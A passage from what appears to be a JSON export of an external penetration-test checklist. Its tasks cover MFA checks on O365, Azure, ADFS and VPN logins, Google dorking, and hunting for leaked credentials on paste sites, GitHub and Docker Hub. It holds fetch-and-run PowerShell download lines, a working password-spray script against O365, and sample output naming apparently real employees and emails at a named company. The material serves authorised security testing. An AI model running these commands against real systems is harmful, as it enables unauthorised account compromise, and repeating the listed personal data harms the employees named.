                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to O365 endpoints and determine if MFA is enabled.\n\nBelow are some notes for grabbing a list of domain users and other information via ADFS using acquired credentials if multi-factor authentication (MAL) has not been enabled in Azure/Office365 environments.\n\n<h3>Install Apps</h3>\n1. Download and install visual studio 10\n\n2. Downoad and install the Lync SDK\n<ncode>https://www.microsoft.com/en-us/download/details.aspx?id=36824\n</ncode>\n3. Download and install Microsoft Online Services Sign-In Assistant for IT Professionals RTW\n<ncode>http://go.microsoft.com/fwlink/?LinkID=286152\n</ncode>\n4. Download and Install the Azure Active Directory Module for Windows PowerShell (64-bit version)\n<ncode>http://go.microsoft.com/fwlink/p/?linkid=236297\n</ncode>\n5. Import the scripts\n<ncode>git clone https://github.com/NetSPI/PowerShell\nimport-module PowerSkype.ps1\nimport-module Get-FederationEndpoint.ps1\n</ncode>\nOR\n<ncode>iex(New-Object net.webclient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)\niex(New-Object net.webclient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/PowerSkype.ps1&quot;)\n</ncode>\n<h3>Fingerprint Federated and Managed Domains</h3>\nSummary:\n<ul><li>managed = in ms cloud</li>\n<li>federated = internally hosted</li>\n</ul>\n1. Check if domain email is managed or federated.\n<ncode>Get-FederationEndpoint -domain domain.com\nEmail     : username@domain.com\nType      : Federated\nDomain    : domain.com\nBrandName : domain.com\nAuthURL   : https://idp.domain.com/idp/profile/SAML2/POST/SSO\n</ncode>\n2. Check if domain is managed or federated\n<ncode>Get-SkypeFederation -domain domain.com\nDomain                 : domain.com\nMS=MS&#42;                 : True\n_sip._tcp              : True\n_sip._tls              : False\n_sipfederationtls._tcp : False\n</ncode>\n3. Get skype status\n<ncode>Get-SkypeStatus -email username@domain.com\n</ncode>\n<h3>Information Gathering for Managed Domains</h3>\n<ol><li>Get list of emails for azure services - must be managed domain</li>\n<li>Reference: https://msdn.microsoft.com/en-us/library/azure/dn194123(v=azure.98).aspx</li>\n<li>Reference: https://msdn.microsoft.com/en-us/library/azure/jj151815(v=azure.98).aspx</li>\n<li>See references for other command examples</li>\n<li>Get Domain Users</li>\n</ol>\n<ncode>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord\nconnect-msolservice -credential $credentials\nGet-MsolDomain\nGet-MsolUser\n</ncode>\n<h3>Information Gathering for federated Domains</h3>\n<ol><li>Get Domain Users</li>\n</ol>\n<ncode>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord\nNew-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection\nGet-PSSession\nId Name            ComputerName    State         ConfigurationName     Availability\n-- ----            ------------    -----         -----------------     ------------\n2 Session2         outlook.offi... Opened        Microsoft.Exchange       Available\nEnter-PSSession 2\nGet-Command | Select-Object Name\n</ncode>\n<h3>Execute a single command and store results to excel file and get domain user information</h3>\n<ncode>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord\nInvoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {Get-Recipient -ResultSize unlimited} | Export-CSV c:\\temp\\domain_users.csv -NoTypeInformation\n</ncode>\n<ol><li>Super slow / dirty dictionary attack option</li>\n</ol>\n<ncode>$Users = Get-Content C:\\temp\\users.txt\n$Password = &quot;Password&quot;\n$Users |\nForEach-Object {\nWrite-Output &quot;Testing $Password on $_&quot;\n$PWord = ConvertTo-SecureString -String &quot;$Password&quot; -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;$_&quot;, $PWord\nInvoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {get-user | select-object name -expandproperty name}\n}\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Sign On - ADFS Launch Page",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4268a98-2af0-11ee-9225-7f9aa1e7889f",
                        "ordinal": 13,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to ADFS endpoints and determine if MFA is enabled.\n\n<h2>Variation: Google Dorks</h2>\nUse the Google dork below to attempt to identify potential sso landing pages.\n<ncode>filetype:aspx IdpInitiatedSignOn.aspx company\nfiletype:aspx IdpInitiatedSignOn.aspx &quot;Sign in to one of the following sites:&quot; company\n</ncode>\nSometimes they are registered on the domain \n<ncode>https://sts.company.com/adfs/ls/IdpInitiatedSignOn.aspx\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor Citrix",
                        "state": 3,
                        "comments": 0,
                        "uid": "c425b2d0-2af0-11ee-921f-43df47366c97",
                        "ordinal": 7,
                        "masterFindingId": 17059911,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to Citrix endpoints and determine if MFA is enabled.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor VPN",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4259fb6-2af0-11ee-921e-e778f3601559",
                        "ordinal": 6,
                        "masterFindingId": 17057476,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to VPN endpoints and determine if MFA is enabled.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Services - Azure - Applications",
                        "state": 3,
                        "comments": 0,
                        "uid": "c425efac-2af0-11ee-9223-7f8ecd406d9c",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to log into Azure with compromised credentials and visit the applications page to determine where you may have access.\n\n<h3>References</h3>\n<ncode><a href='https://account.activedirectory.windowsazure.com/r#/applications'>https://account.activedirectory.windowsazure.com/r&#35;/applications</a> \n</ncode>\n<b>Note:</b> Some of the application may suffer from Citrix style breakouts that can be leveraged to pivot into the cloud or on-premise environments.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Services - Azure - Services that Support ADFS/SSO",
                        "state": 3,
                        "comments": 0,
                        "uid": "c42708c4-2af0-11ee-9229-c381c50c0caf",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nIdentify internet facing third party applications being used by the company that accept their federated/manager domain credentials.\n\n<h2><b>Variation: Unauthenticated</b></h2>\n1. Perform google searches relate to the domains and know sso landing pages.\n<h3>Examples:</h3>\n<ncode>inurl:adfs/ls/IdpInitiatedSignOn.aspx site: clientdomain.com\ninurl:/idp/startSSO.ping?PartnerSpId= site: clientdomain.com\n</ncode>\n2.  Review DNS TXT records for validation tokens that can indicate third part websites being used. Details can be found on in the blog at:\n<ncode>https://blog.netspi.com/analyzing-dns-txt-records-to-fingerprint-service-providers/.\n</ncode>\n<h3>Example PowerShell Command:</h3>\n<ncode>&#35; Load Resolve-DnsDomainValidationToken into the PowerShell session\nIEX(New-Object System.Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Resolve-DnsDomainValidationToken.ps1&quot;)\n\n&#35; Run Resolve-DnsDomainValidationToken to collect and fingerprint TXT records\n$Results = Resolve-DnsDomainValidationToken -Verbose -Domain adroll.com \n\n&#35; View records in the console\n$Results\n</ncode>\n3. Conduct brute forcing of known subdomains/URL paths on third party sites. For example, slack, salesforce, servicenow, aws, sharepoint.com, etc.\n\n<b>Note:</b> This is an area that we need to do more research and build automation for.\n\n<h2><b>Variation: Authenticated</b></h2>\n1. Download the SPNs from azure to get a list of 3rd party size that support sso. This can be done using Microburst. Review the source code for additional instructions on how to connect to the subscription.\n<ncode>IEX(New-Object System.Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/MicroBurst/2bbdeb56babe2cfabb7d10cf64b97eb55c9765c3/Az/Get-AzDomainInfo.ps1&quot;)\nGet-AzDomainInfo -folder MicroBurst -Verbose\n</ncode>\n<h3><b>Additional Links</b></h3>\n<ncode>https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/introducing-azucar/\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Services - Azure - Portal Access",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4276cce-2af0-11ee-922a-6f2988ab001e",
                        "ordinal": 2,
                        "masterFindingId": 17062400,
                        "taskInstructions": "<h2>Instructions</h2>\nConfirm that MFA is not required for the Azure account by using Login-AzureRmAccount to login.\n\n<h2>Variation: Manual</h2>\n1. Install the AzureRM powershell module.\n<ncode>install-module azurerm\n</ncode>\n2. Run the module.\n<ncode>Login-AzureRmAccount -Verbose\nVERBOSE: Performing the operation &quot;log in&quot; on target &quot;User account in environment 'AzureCloud'&quot;.\nEnvironment           : AzureCloud\nAccount               : CAG@wingsfinancial.com\nTenantId              : 2375eba9-af99-4b2d-8eaf-7884911dde9f\nSubscriptionId        :\nSubscriptionName      :\nCurrentStorageAccount :\nPS C:\\windows\\system32&gt; get-AzureRmADUser\nUserPrincipalName                       DisplayName             Id\n-----------------                       -----------             --\n1185z9@wingsfinancialcu.onmicrosoft.com Dan N. Riley            63a5d579-2789-4396-83d5-73aa2be9a8c8\n1441@wingsfinancial.com                 Michelle Lange          fd60fdce-0181-4ef3-9b83-73e1e994fb20\n1518@wingsfinancial.com                 Abigail Sisley          f37d4217-8239-4083-931d-c2ea1e3197c1\n1596@wingsfinancial.com                 Karen Barrett           12cc630c-9f72-4828-82ea-4107d330f1a5\n1598@wingsfinancial.com                 Gail Mills              48f6b83d-e0af-44ad-9bdc-db2292ab5cc6\n1599@wingsfinancial.com                 Janet Pedersen          f2fa52c5-971e-4c88-981b-7a1c08a9b1ed\n1600@wingsfinancial.com                 Diane Weibye-Buzzell    148936ca-47ee-49eb-b916-529d8845e05e\n1603@wingsfinancial.com                 Phanta Liu              a05137f5-8a93-4da4-8fd8-94d62a095463\n1608@wingsfinancial.com                 Barb Wajda              a09dbdcc-670b-4b1c-8308-ee9c8247ba90\nget-command -module &quot;&#42;azurerm&#42;&quot;\n</ncode>\n3. Inspect the ADResourceProperty\n<ncode>PS C:\\windows\\system32&gt; Get-ADResourceProperty\nget-azureRMAdGroup\n</ncode>\n<h2>Variation: Azure CLI</h2>\n1. Install the needed tools.\n<ncode>https://docs.microsoft.com/en-us/azure/cli-install-nodejs\nhttp://aka.ms/webpi-azure-cli\nhttps://docs.microsoft.com/en-us/azure/xplat-cli-connect\n</ncode>\n2. Login to Azure\n<ncode>azure login -u myUserName@contoso.onmicrosoft.com\n</ncode>\n<h2>Variation: Azure Portal</h2>\n1. Navigate to the Azure login portal.\n<ncode>log into https://portal.azure.com/\n</ncode>\n<h3>Reference</h3>\n<ncode>https://docs.microsoft.com/en-us/rest/api/\n</ncode>\n<h2>Variation: Google Dorks</h2>\n1. In google search:\n<ncode>inurl:adfs/ls/IdpInitiatedSignOn.aspx site: clientdomain.com\ninurl:/idp/startSSO.ping?PartnerSpId= site: clientdomain.com\n</ncode>\nIf you have a page come back they typically include site where federated authentication can be used.\n\n<h3>Reference</h3>\n<ncode>https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/introducing-azucar/\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor Terminal Services",
                        "state": 3,
                        "comments": 0,
                        "uid": "c425c6bc-2af0-11ee-9221-e7bd42f3bb3e",
                        "ordinal": 8,
                        "masterFindingId": 17064591,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to terminal endpoints and determine if MFA is enabled. This could be RDP or web-based terminal services.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "VPN - Discover Endpoints that Accept Pre-Shared Keys",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4260e60-2af0-11ee-9224-77d6ece926b9",
                        "ordinal": 5,
                        "masterFindingId": 5050824,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nEnumerate VPN endpoints that utilize pre-shared keys (PSK).\n\n<h2>Variation: ike-scan</h2>\n1. Run ike-scan against all IP addresses. Any system that responds with a full handshake or &quot;Notify message 14 (NO-PROPOSAL-CHOSEN)&quot; support VPN connections.\n<ul><li>Full handshakes typically indicates that use of a preshared key is supported.</li>\n<li>Notify message 14 typically indicates that the VPN server exists, but acces is restricted to specific IP addresses.</li>\n</ul>\nThose systems that response with a full handshake should also be added to the VPN finding.\n<h3>Examples:</h3>\n<ncode><b>ike-scan -M vpn.netspi.com</b>\n\nStarting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n209.118.108.195 Main Mode Handshake returned\n        HDR=(CKY-R=d741e3d99130678a)\n        SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\n        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\n\nEnding ike-scan 1.9.4: 1 hosts scanned in 0.012 seconds (81.03 hosts/sec).  1 returned handshake; 0 returned notify\n</ncode>\nBelow are additional command examples:\n<ncode>ike-scan -M 1.1.1.1\nike-scan -M 192.168.1.0/24\n</ncode>\nBelow is a basic script to execute against a list of IP addresses.\n<ncode>while read line; do\n        ike-scan $line\ndone &lt;  ips.txt\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor VMWare VDI",
                        "state": 3,
                        "comments": 0,
                        "uid": "c426f852-2af0-11ee-9228-dfe1911579ca",
                        "ordinal": 9,
                        "masterFindingId": 17064592,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to VDI endpoints and determine if MFA is enabled.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor Web Interface (Generic)",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4258ae4-2af0-11ee-921d-77a6723cf52e",
                        "ordinal": 11,
                        "masterFindingId": 17065400,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to web interfaces and determine if MFA is enabled.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Services - Digital Ocean Console",
                        "state": 3,
                        "comments": 0,
                        "uid": "c426b68a-2af0-11ee-9226-c32033bd0658",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to Digital Ocean and determine if MFA is enabled.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 6,
                "id": 350466,
                "name": "Reconnaissance: Company Files",
                "description": "The goal of this task group is to identify files on the internet that reveal sensitive company data, source code, or credentials that could be used in later phases of the attack.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Online Search Engines",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4282aba-2af0-11ee-922d-c78c96078c92",
                        "ordinal": 5,
                        "masterFindingId": 17063359,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nUse Google dorks to search for company related files and information.\n\n<h2>Variation: Manual</h2>\nSearch for file types on company websites:\n<ncode>site:companysite.com filetype:config \nsite:companysite.com filetype:txt\nsite:companysite.com filetype:xml\nsite:companysite.com filetype:xls\n</ncode>\nReview company site search reseults for interesting subdomains and content:\n<ncode>site:companysite.com -&quot;www&quot; -&quot;thingtoremove&quot;\n</ncode>\nSearch for company references on  common help forums:\n<ncode>site:bleepingcomputer.com companyname\nsite:stackoverflow.com companyname\n</ncode>\nSearch for company email footers to find email posting:\n<ncode>companyname +&quot;email footer language here&quot;\n</ncode>\n<h3><b>Reporting Requirements</b></h3>\nTrack URLs in task notes that have interesting information or confidential data. For exposed sensitive data, create a separate high severity finding.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Online Clipboards [Non Sensitive Info] ",
                        "state": 2,
                        "comments": 1,
                        "uid": "c427cfac-2af0-11ee-922c-039b8ccbf3ff",
                        "ordinal": 4,
                        "masterFindingId": 17068006,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to identify files through Google dorking common online clipboard sites.\n\n<h2>Variation: Manual</h2>\n<b>Google Dorks</b>\nBelow are a few search examples.\n<ncode>Site:pastebin.com &quot;companyname&quot; keywords\nSite:pastey.com &quot;companyname&quot; keywords\n</ncode>\n<b>Below are common online clipboards:</b>\n<ncode>http://pastebin.com/\nhttps://cipher387.github.io/pastebinsearchengines/\nhttps://redhuntlabs.com/online-ide-search\nhttp://www.filedropper.com/\nhttp://FriendPaste.com\nhttp://CopyTaste.com\nhttp://Cl1p.net\nhttp://ShortText.com\nhttp://TextSave.de\nhttp://TextSnip.com\nhttp://TxtB.inhttp://jsfiddle.net/\n</ncode>\nAn online tool to search a number of paste sites at once is located here:\n<ncode>https://netbootcamp.org/pastesearch.html&#35;gsc.tab=0\n</ncode>\n<b>Finding Additional Online Clipboards</b>\nIf you are able to get the blocklists from a web proxy, then you may be able to filter for common online clipboards that are on that list. If you get one of those blocklists please reference it here.\n\n<h3>Other references</h3>\nhttps://posts.specterops.io/being-a-good-domain-shepherd-57754edd955f\nhttps://blog.netspi.com/adding-web-content-filter-exceptions-for-phishing-success/\nhttps://github.com/jarun/googler\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Online Code Repositories (Github) [Non Sensitive Info] ",
                        "state": 2,
                        "comments": 1,
                        "uid": "c42878e4-2af0-11ee-922f-cf6977967aae",
                        "ordinal": 2,
                        "masterFindingId": 17063992,
                        "taskInstructions": "<h2>Variation: Manual</h2>\n1. Always search using multiple keywords. Once keyword should be client specific and one related to the data type. Common generic keywords to use with company specific information:  \n<ul><li>password</li>\n<li>secret</li>\n<li>key</li>\n<li>private</li>\n<li>user</li>\n<li>account</li>\n<li>connectionstring</li>\n<li>confidential</li>\n<li>proprietary</li>\n</ul>\n2. Using Active Directory domains, applications names, and legal language specific to the client can be very effective.\n\n3. Reuse information discovered in additional searches. Active Directory domains and legal language especially.\n\n4. Sample data using some of the strategies below when there are million of records:\n<ul><li>Sample high value file types associated with config files, server side languages, and desktop app languages (c&#35;, java, asp, c++, .conf, .xml, ,json etc)</li>\n<li>Group/sample by the same username (only review a handful of code example for any single user, and mark them for follow up as needed)</li>\n<li>Group/sample by the same Repository name (many time different users will have copies of the same repository)</li>\n<li>Group/sample by the same File name (only review a handful for any single filename)</li>\n</ul>\n<h2>Variation: Trufflehog</h2>\n1. Download the latest release.\n<ul><li>https://github.com/trufflesecurity/trufflehog</li>\n</ul>\n2. Run the tool.\n<h3>Example:</h3>\n<ncode>trufflehog github --org=netspi\n</ncode>\n<b>Additional Checks</b>\nReview .git in relevant public repositories.\n<a href='https://github.com/liamg/gitjacker'>https://github.com/liamg/gitjacker</a>\n\n<b>Reporting Requirements</b>\n<ol><li>Ensure all affected URLs are included in the verification</li>\n<li>Ensure a sample of redacted examples is included in the verification for each data type exposed</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Spiderfoot",
                        "state": 3,
                        "comments": 0,
                        "uid": "c428bc8c-2af0-11ee-9230-b7ab6b8dc1ac",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nUse spiderfoot to enumerate interesting files.\n\n<h2>Variation: Spiderfoot</h2>\n1. Download and install spiderfoot.\n<ncode>git clone https://github.com/smicallef/spiderfoot.git\ncd spiderfoot\ndocker build -t spiderfoot .\n</ncode>\n2. Run spiderfoot.\n<ncode>docker run -it -p 5001:5001 -d spiderfoot\n</ncode>\n3. Use the web interface to search.\n<ncode>http://localhost:5001\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Online Code Repositories (Github) [Sensitive Info] ",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4285120-2af0-11ee-922e-d78d885afb92",
                        "ordinal": 1,
                        "masterFindingId": 17062676,
                        "taskInstructions": "<h2>Instructions</h2>\nSearch online code repositories for sensitive information and credentials.\n<h3></h3>\n<h2>Variation: Manual</h2>\n1. Always search using multiple keywords. Once keyword should be client specific and one related to the data type. Common generic keywords to use with company specific information:  \n<ul><li>password</li>\n<li>secret</li>\n<li>key</li>\n<li>private</li>\n<li>user</li>\n<li>account</li>\n<li>connectionstring</li>\n<li>confidential</li>\n<li>proprietary</li>\n</ul>\n2. Using Active Directory domains, applications names, and legal language specific to the client can be very effective.\n\n3. Reuse information discovered in additional searches. Active Directory domains and legal language especially.\n\n4. Sample data using some of the strategies below when there are million of records:\n<ul><li>Sample high value file types associated with config files, server side languages, and desktop app languages (c&#35;, java, asp, c++, .conf, .xml, ,json etc)</li>\n<li>Group/sample by the same username (only review a handful of code example for any single user, and mark them for follow up as needed)</li>\n<li>Group/sample by the same Repository name (many time different users will have copies of the same repository)</li>\n<li>Group/sample by the same File name (only review a handful for any single filename)</li>\n</ul>\n<h2>Variation: Trufflehog</h2>\n1. Download the latest release.\n<ul><li>https://github.com/trufflesecurity/trufflehog</li>\n</ul>\n2. Run the tool.\n<h3>Example:</h3>\n<ncode>trufflehog github --org=netspi\n</ncode>\n<b>Additional Checks</b>\nReview .git in relevant public repositories.\n<a href='https://github.com/liamg/gitjacker'>https://github.com/liamg/gitjacker</a>\n\n<b>Reporting Requirements</b>\n<ol><li>Ensure all affected URLs are included in the verification</li>\n<li>Ensure a sample of redacted examples is included in the verification for each data type exposed</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": true
                    },
                    {
                        "name": "Online Docker Repositories",
                        "state": 2,
                        "comments": 1,
                        "uid": "c428e6f8-2af0-11ee-9231-33b8694dca02",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview docker hub for keywords related to the company. Provides insights into technologies, environment information, and in some cases credentials.\n\n<h2>Variation: Manual</h2>\nSearch URL\n<ncode>https://hub.docker.com/search?q=optum&amp;type=image  \n</ncode>\nUsually you'll download the docker image, run it, and then review it for cached / stored credentials. Below instructions work for kali linux.\n<ol><li>apt-get install docker</li>\n<li>dockerd</li>\n<li>docker pull usbank/testnode</li>\n<li>docker images</li>\n<li>docker run -i -t 3e2d36063d1f /bin/bash</li>\n</ol>\n<h2>Additional Tools/Articles</h2>\n<a href='https://github.com/deepfence/SecretScanner'>https://github.com/deepfence/SecretScanner</a>\n<a href='https://ioactive.com/guest-blog-docker-hub-scanner-matias-sequeira/'><u>https://ioactive.com/guest-blog-docker-hub-scanner-matias-sequeira/</u></a>\n<a href='https://github.com/matiassequeira/docker_explorer'>https://github.com/matiassequeira/docker_explorer</a>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Online Clipboards [Sensitive Info] ",
                        "state": 2,
                        "comments": 1,
                        "uid": "c42791fe-2af0-11ee-922b-e7aa84e0fb2e",
                        "ordinal": 3,
                        "masterFindingId": 17063358,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to identify files through Google dorking common online clipboard sites.\n\n<h2>Variation: Manual</h2>\n<b>Google Dorks</b>\nBelow are a few search examples.\n<ncode>Site:pastebin.com &quot;companyname&quot; keywords\nSite:pastey.com &quot;companyname&quot; keywords\nsite:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com | site:friendpaste.com | site:cl1p.com | site:textsave.de | site:textsnip.com | site:txtb.in | site:shorttext.com | site:filedropper.com &lt;domain&gt;\n</ncode>\n<b>Below are common online clipboards:</b>\n<ncode>http://pastebin.com/\nhttps://cipher387.github.io/pastebinsearchengines/ \nhttps://redhuntlabs.com/online-ide-search\nhttp://www.filedropper.com/\nhttp://FriendPaste.com\nhttp://CopyTaste.com\nhttp://Cl1p.net\nhttp://ShortText.com\nhttp://TextSave.de\nhttp://TextSnip.com\nhttp://TxtB.in\nhttp://jsfiddle.net/\n</ncode>\nAn online tool to search a number of paste sites at once is located here:\n<ncode>https://netbootcamp.org/pastesearch.html&#35;gsc.tab=0\n</ncode>\n<b>Finding Additional Online Clipboards</b>\nIf you are able to get the blocklists from a web proxy, then you may be able to filter for common online clipboards that are on that list. If you get one of those blocklists please reference it here.\n\n<h3>Other references</h3>\nhttps://posts.specterops.io/being-a-good-domain-shepherd-57754edd955f\nhttps://blog.netspi.com/adding-web-content-filter-exceptions-for-phishing-success/\nhttps://github.com/jarun/googler\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 7,
                "id": 350467,
                "name": "Information Gathering: ASM",
                "description": "",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "ExPen Tasks Performed by ASM",
                        "state": 2,
                        "comments": 0,
                        "uid": "c428fc38-2af0-11ee-9232-1f13230d4edf",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Objective</h2>\nThis task contains a list of all ExPen checklist items that should be completed by the ASM platform. Tasks are also marked in the checklist with [ASM].\n<h2>Checklist Items</h2>\n<h3>Reconnaissance: Domain Names</h3>\nRDNS\nSubDomains - SSL Certificate Scanning\nSubDomains - Brute Forcing\nTXT Records - Domain Validation Token\nTXT Records - SPF\nSRV Records - Internal IPs\nValidate Discovered Domains Resolve to in-scope IPs\nValidate Discovered Domains Resolve to in-scope IPs - Remove Out of Scope Domains\n\n<h3>Information Gathering: Live Systems</h3>\nDiscovery Scanning - Ping\nDiscovery Scanning - TCP\nFull Port Scan - TCP\nDiscovery Scanning - UDP\n\n<h3>Vulnerability Enumeration: Automated Scanning</h3>\nWeb Layer - Burp Cluster Scan\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "ASM Scanning",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4290a48-2af0-11ee-9233-8f0a71886ed5",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Navigate the ASM tab in your project.\n2. Click the &quot;Start Scan&quot; button in the middle of the screen.\n3. In the pop-up window, add all IPs and domains in scope as a line separated list.\n4. Data will continue to update as the scan runs. You can view data in ASM by clicking the &quot;View in ASM&quot; button in the upper right.\n5. Review the data in the Assets and Exposures sections for interesting data and newly discovered assets requiring manual approval such as new root domains or IPs. If new root domains or IPs are discovered, determine if they are in-scope, if so, click the asset, then click the button &quot;Add to Monitoring&quot; to include in future scans.\n6. Additional IPs and Domains you may discover through manual discovery can be added to the scan scope by clicking &quot;View in ASM&quot;, clicking &quot;Assets&quot; in the left sidebar, clicking either Domains or IP Addresses tile cards, then clicking the &quot;+&quot; button in the upper right corner. Enter the additional assets in right hand pane. Use the &quot;Manual Discovery&quot; option for attribution if needed. <b>Assets added while a scan is currently running will not be added to the scan. An additional scan will need to be run as detailed in the next step.</b>\n7. Once the first scan has completed, a second scan should be run to include any newly discovered data. Click the &quot;View in ASM&quot; button, click &quot;Operations&quot; in the left sidebar, click the ExPen operation, then click &quot;Run&quot; to start another scan.\n8. Repeat as needed for additional data.\n9. Once the scan has completed, export the live IP list from the Assets: IPs page for use in Nessus and Nexpose. Export the live domain list from Exposures: DNS for use in scans as well.\n10. Findings should automatically sync to the workspace once the scan completes, but a manual sync can be triggered if needed by clicking the &quot;Sync to Workspace&quot; button in the upper right.\n\n<b>NOTE: </b>Do NOT click the <b>Scan Certificate Transparency Logs</b> button! The results will automatically be added to ASM monitoring, which will cause ASM to scan out-of-scope hosts during future rounds.\n\nAfter ASM completes scanning, make sure to check and see if any IP addresses timed out, and if there are newly discovered domains that should be scanned as well\n<ul><li>Domains that have not been port scanned: Assets &gt; Domain &gt; search bar: !_exists_:live</li>\n<li>IPs that timed out port scanning: Assets &gt; IP &gt; search bar: portScanTimedOut:true</li>\n</ul>\n\n<h3>Reporting Requirements</h3>\nExport the following data sources and upload to the Artifacts section in Resolve.\n<ul><li>Assets: IPs</li>\n<li>Assets: Domains</li>\n<li>Exposures: DNS</li>\n<li>Exposures: 